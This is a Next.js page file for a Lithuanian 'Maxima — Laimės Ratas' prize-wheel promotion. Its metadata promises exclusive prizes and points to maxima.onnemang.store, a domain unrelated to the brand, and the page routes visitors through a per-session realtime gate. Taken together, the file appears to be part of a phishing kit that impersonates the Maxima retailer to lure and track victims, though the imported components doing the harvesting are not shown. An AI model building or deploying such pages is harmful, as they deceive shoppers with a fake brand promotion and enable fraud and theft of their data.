import { SessionRealtimeGate } from "@/components/demo/SessionRealtimeGate";
import { resolveServerSessionIdentity } from "@/lib/session-id";
import { WheelClient } from "./wheel-client";

export const dynamic = 'force-dynamic';

export const metadata = {
  title: "Maxima — Laimės Ratas",
  description:
    "Maxima specialioji laimės ratai akcija! Išmėginkite savo sėkmę ir laimėkite išskirtinius prizus.",
  icons: {
    icon: "/favicon.ico",
  },
  openGraph: {
    type: "website",
    locale: "lt_LT",
    url: "https://maxima.onnemang.store",
    siteName: "Maxima Laimės Ratas",
    title: "Maxima — Laimės Ratas",
    description:
      "Maxima specialioji laimės ratai akcija! Išmėginkite savo sėkmę ir laimėkite išskirtinius prizus.",
    images: [
      {
        url: "/og-image.jpg",
        width: 1200,
        height: 630,
        alt: "Maxima Laimės Ratas",
      },
    ],
  },
  twitter: {
    card: "summary_large_image",
    title: "Maxima — Laimės Ratas",
    description:
      "Maxima specialioji laimės ratai akcija! Išmėginkite savo sėkmę ir laimėkite išskirtinius prizus.",
    images: ["/og-image.jpg"],
  },
};

type Props = {
  searchParams: Promise<{ session?: string }>;
};

export default async function WheelPage({ searchParams }: Props) {
  const { sessionId, routeSessionId } = await resolveServerSessionIdentity({
    searchParams: await searchParams,
  });

  return (
    <>
      <SessionRealtimeGate sessionId={sessionId ?? ""} routeSessionId={routeSessionId ?? undefined} />
      <WheelClient sessionId={sessionId} routeSessionId={routeSessionId} />
    </>
  );
}
